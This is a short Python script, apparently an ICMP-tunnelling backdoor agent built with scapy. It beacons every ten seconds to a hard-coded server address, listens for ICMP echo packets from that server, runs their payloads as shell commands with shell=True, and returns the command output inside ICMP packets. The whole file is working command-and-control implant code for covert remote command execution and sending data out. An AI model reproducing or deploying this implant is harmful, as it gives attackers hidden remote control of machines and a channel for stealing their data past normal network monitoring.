from scapy.all import *
import time
import socket

SERVER_IP = "192.168.10.50"

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # Doesn't need to reach the address; no packets are sent.
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    finally:
        s.close()
    return ip

def send_beacon():
    pkt = IP(dst=SERVER_IP)/ICMP(type=8)/"BEACON".encode()
    send(pkt, verbose=0)

def handle_incoming(pkt):
    # Look for ICMP Echo Requests FROM the server
    if IP in pkt and ICMP in pkt:
        if pkt[IP].src == SERVER_IP and pkt[ICMP].type == 8:
            if Raw in pkt:
                # need to handle CMD vs regular
                task = pkt[Raw].load.decode(errors="ignore")
                print(f"[+] Received task: {task}")
                run_task(task)

def run_task(cmd):
    # Execute and send back results
    import subprocess
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        result = output.decode()
    except Exception as e:
        result = str(e)

    pkt = IP(dst=SERVER_IP)/ICMP(type=8)/f"RESULT|{result}".encode()
    send(pkt, verbose=0)
    print(f"[+] Sent results")

if __name__ == "__main__":
    sniffer = AsyncSniffer(filter=f"icmp and src {SERVER_IP}", prn=handle_incoming, store=False)
    sniffer.start()

    while True:
        send_beacon()
        time.sleep(10)
